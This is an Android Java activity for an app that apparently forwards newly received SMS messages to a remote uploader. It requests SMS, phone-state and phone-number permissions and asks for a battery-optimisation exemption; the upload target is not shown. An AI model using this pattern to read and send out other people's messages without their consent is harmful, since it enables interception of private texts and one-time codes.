package com.autov.sms;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private ActivityResultLauncher<String[]> permsLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ((TextView) findViewById(R.id.status)).setText("✅ Only NEW SMS are sent");

        QueueUploader.ensureBaselineNow(this);

        // 1) Register the launcher
        permsLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestMultiplePermissions(),
                result -> {
                    Toast.makeText(this, "Permissions updated", Toast.LENGTH_SHORT).show();
                    // You could check result map here if you need to react per-permission
                }
        );

        // 2) Build a list of missing permissions
        List<String> missing = new ArrayList<>();
        addIfMissing(missing, Manifest.permission.RECEIVE_SMS);
        addIfMissing(missing, Manifest.permission.READ_SMS);
        addIfMissing(missing, Manifest.permission.READ_PHONE_STATE);
        // READ_PHONE_NUMBERS is separate on newer Android
        addIfMissing(missing, Manifest.permission.READ_PHONE_NUMBERS);

        // 3) Launch ONE request (only if anything is missing)
        if (!missing.isEmpty()) {
            permsLauncher.launch(missing.toArray(new String[0]));
        }

        maybeAskIgnoreBatteryOptimizations();

        // Try an initial flush (e.g., if installed while offline)
        QueueUploader.flushQueueIfAny(this);
    }

    private void addIfMissing(List<String> out, String perm) {
        if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
            out.add(perm);
        }
    }

    private void maybeAskIgnoreBatteryOptimizations() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm == null) return;
            String pkg = getPackageName();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!pm.isIgnoringBatteryOptimizations(pkg)) {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + pkg));
                    startActivity(intent);
                }
            }
        } catch (Exception ignore) {}
    }
}
